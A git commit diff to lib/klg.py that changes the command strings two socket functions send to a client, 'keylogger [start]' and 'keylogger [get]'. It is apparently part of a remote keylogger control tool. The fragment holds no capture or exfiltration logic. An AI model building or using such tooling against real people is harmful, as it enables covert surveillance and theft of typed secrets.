0cde46584f87913c7c200be842d8c1a1d78e41df
Gustybobby <napattatiyakaroonwong@gmail.com>
2025-10-05 21:27:40 +0700

    fix args

--- lib/klg.py
+++ lib/klg.py
@@ -3,10 +3,10 @@ from . import comm, config
 
 
 def call_keylogger_start(client: socket.socket):
-    comm.send(client, f"keylogger start", config.SERVER_VERBOSE)
+    comm.send(client, f"keylogger [start]", config.SERVER_VERBOSE)
     comm.receive(client, config.SERVER_VERBOSE)
 
 
 def call_keylogger_get(client: socket.socket):
-    comm.send(client, f"keylogger get", config.SERVER_VERBOSE)
+    comm.send(client, f"keylogger [get]", config.SERVER_VERBOSE)
     comm.receive(client, config.SERVER_VERBOSE)
